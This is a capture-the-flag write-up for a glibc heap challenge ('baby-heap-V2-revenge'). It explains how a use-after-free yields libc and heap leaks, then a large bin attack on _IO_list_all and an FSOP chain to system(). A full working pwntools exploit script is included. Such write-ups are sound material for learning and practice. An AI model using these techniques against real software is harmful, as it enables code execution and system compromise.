# baby-heap-V2-revenge 
Author: datious

![image](https://hackmd.io/_uploads/HJPAjme9zl.png)
**Overview:**
- The program has four functions like below:
```
──(pwnenv)─(datious㉿datious)-[~/CTF/ptit/baby-heap-V2-patch]
└─$ ./chall      

== babyheap-V2_patch ==
1. Create
2. Read
3. Edit
4. Delete
> Session closed
```
- Option 1 - Create: create a chunk with a specified size.
- Option 2 - Read: read the content of the chunk that was initialized.
- Option 3 - Edit: Edit the content of the chunk.
- Option 4 - Delete: free a chunk. (UAF vulnerability)
- Constraints: maximum of 6 allocations, 4 frees, 3 edits. 
=> This program different from previous one, which only allows to create and edit data in the heap area.
- Mitigations:
![image](https://hackmd.io/_uploads/r1NVfNl9Gg.png)

- The flow of the exploitation strategy:  leak libc and heap addresses -> large bin attack -> FSOP -> Shell

**1. Analyzing and Exploiting**
- Stage 1: Leverage UAF vulnerability to leak libc address and heap address (chunk).
    + This is my strategy:
    ```
    create(0,0x420,b'A'*0x420)
    create(1,0x18,b'B'*0x10+b'sh\x00\x00\x00\x00') #guard
    create(2,0x410,b'C'*0x410)
    create(3,0x8,b'C'*0x8)  #guard
    ```
    *Guard: avoids consolidation.
    + The first, we delete chunk0 to move it into unsorted bin (fd pointer is a libc address)
    + The second, we read the content of the chunk0 by UAF vulnerability.
    ![image](https://hackmd.io/_uploads/Bknqq4xqGl.png)
 => We successfully leaked the libc address.
    + The third: 
    ```
    create(4,0x450,b'E'*450) # chunk 0->large bin
    ```
    -> The objective is to move place chunk0 into the large bin. The memory layout of chunk0 when it is moved into the large bin:
    ```
    *offset layout:
    0x00:prev_size 0x08:size
    0x10:fd_pointer 0x18:bk_pointer (User data area)
    0x20:fd_nextsize 0x28:bk_nextsize
    ```
    -> We read the content of chunk0 while it is in the large bin -> we will leak fd_nextsize from offset 0x20 (which is offset 0x10 in the user data area).
    ```
    read_action(0)
    p.recvuntil(b'Data: ')
    leak2=p.recvn(0x420)
    chunk0=u64(leak2[0x10:0x18])+0x10 #fd_nextsize
    log.info("chunk 0: "+hex(chunk0))
    ```
    -> After reading the data using u64(leak2[0x10:0x18]), we get the fd_nextsize pointer, which points to teh metadata of chunk0. We then need to add 0x10 to this value so that it points directly to the user data area of chunk0.
    ![image](https://hackmd.io/_uploads/SyOHeTx5fg.png)
-> Successfully leaked the heap address.

- Stage 2: Large bin attack
    + We select chunk2 as our FSOP target.
    + First of all, we overwrite the bk_nextsize of chunk0 to point to *IO_list_all*. 
    + Large bin attack explaination:

    ```
    Large bin attack:
    - Victim chunk: victim-chunk2
    - Fake chunk: fwd-chunk0
    - victim size < fwd size
    fwd :
    + fd_nextsize: fwd
    + bk_nextsize: fwd (fake)
    1.victim is moved into the large bin:
    2.victim->fd_nextsize = fwd
    3.victim->bk_nextsize = fwd->bk_nextsize (fake by (IO_list_all+0x20))
    4.victim->bk_nextsize->fd_nextsize = victim. ((IO_list_all-0x20)+0x20=victim)
    ```
    + Code:
    ```
    #large bin attack
    FF = chunk0+0x430+0x10 #header address of chunk2
    delete_action(2) #chunk2 is smaller than chunk1 so that chunk2's fd_nextsize will point to
    fake_bk_nextsize=bytearray(leak2)
    fake_bk_nextsize[0x18:0x20] = p64(libc.sym["_IO_list_all"]-0x20)
    edit(0,bytes(fake_bk_nextsize))
    create(5,0x440,b'X'*440) # trigger for overwrite IO_list_all = chunk2
    ```
    
    ![image](https://hackmd.io/_uploads/HJgSUZRx5Gg.png)



- Stage 3: FSOP
    + Chunk2 Arrangement and Set up:
    ```
    fsop = flat({
        0x20 - 0x10: 0, #write base
        0x28 - 0x10: 1, #write pointer
        0x68 - 0x10: system, #wide_vtable[0x68]
        0x88 - 0x10: FF+0x240, #lock
        0xa0 - 0x10: FF, #wide_data
        0xd8 - 0x10: IO_wfile_jumps, #vtable
        0xe0 - 0x10: FF #wide vtable
        },filler = b'\x00',length=0x410)

    edit(2,fsop)
    ```
- When the program finish, exit() function will be called -> glibc will execute _IO_flush_all_lockp(), this function have mission is to iterate through all open file streams in _IO_list_all (which is pointing to heap) -> compare write_base < write_pointer - glibc consider that this stream is having the data which need to flush out -> Calling Vtable through _IO_OVERFLOW -> Executing system.

**2. Script**
```
#!/usr/bin/python3 
from pwn import *

exe=ELF('./chall_patched',checksec=False)
libc=ELF('./libc.so.6',checksec=False)
context.arch='amd64'
#p=remote("127.0.0.1",6300)
p=process(exe.path)


def create(index,size,data):
	p.sendlineafter(b'> ',str(1).encode())
	p.sendlineafter(b'Index: ',str(index).encode())
	p.sendlineafter(b'Size: ',str(size).encode())
	p.sendlineafter(b'Data: ',data)

def read_action(index,size=8):
	p.sendlineafter(b'> ',str(2).encode())
	p.sendlineafter(b'Index: ',str(index).encode())
	

def edit(index,data):
	p.sendlineafter(b'> ',str(3).encode())
	p.sendlineafter(b'Index: ',str(index).encode())
	p.sendlineafter(b'Data: ',data)

def delete_action(index):
	p.sendlineafter(b'> ',str(4).encode())
	p.sendlineafter(b'Index: ',str(index).encode())


#part1: leak libc
create(0,0x420,b'A'*0x420)
create(1,0x18,b'B'*0x10+ b'  sh\x00\x00\x00\x00')
create(2,0x410,b'C'*0x410)	
create(3,0x8,b'C'*0x8)

delete_action(0)
read_action(0)
p.recvuntil(b'Data: ')
leak=u64(p.recv(6).ljust(8,b'\x00'))
log.info("libc leaked: "+hex(leak))
libc.address=leak-0x21ace0
log.info("libc base: "+hex(libc.address))

#info significant addresses
IO_list_all=libc.sym['_IO_list_all']
IO_wfile_jumps=libc.sym['_IO_wfile_jumps']
system=libc.sym['system']
stdout=libc.sym['_IO_2_1_stdout_']
log.info("stdout: "+hex(stdout))
log.info("system: "+hex(system))
log.info("IO list all: "+hex(IO_list_all))
log.info("IO wfile jumps: "+hex(IO_wfile_jumps))
create(4,0x450,b'E'*450) # chunk 0->large bin
read_action(0)
p.recvuntil(b'Data: ')
leak2=p.recvn(0x420)
chunk0=u64(leak2[0x10:0x18])+0x10 #fd_nextsize
log.info("chunk 0: "+hex(chunk0))


#large bin attack
FF = chunk0+0x430+0x10 #header address of chunk2
delete_action(2) #chunk2 is smaller than chunk1 so that chunk2's fd_nextsize will point to
fake_bk_nextsize=bytearray(leak2)
fake_bk_nextsize[0x18:0x20] = p64(libc.sym["_IO_list_all"]-0x20)
edit(0,bytes(fake_bk_nextsize))
create(5,0x440,b'X'*440) # trigger for overwrite IO_list_all = chunk2

fsop = flat({
	0x20 - 0x10: 0, #write base
	0x28 - 0x10: 1, #write pointer
	0x68 - 0x10: system, #wide_vtable[0x68]
	0x88 - 0x10: FF+0x240, #lock
	0xa0 - 0x10: FF, #wide_data
	0xd8 - 0x10: IO_wfile_jumps, #vtable
	0xe0 - 0x10: FF #wide vtable
	},filler = b'\x00',length=0x410)

edit(2,fsop)

p.interactive()

```

![image](https://hackmd.io/_uploads/rJwuIAe9fe.png)
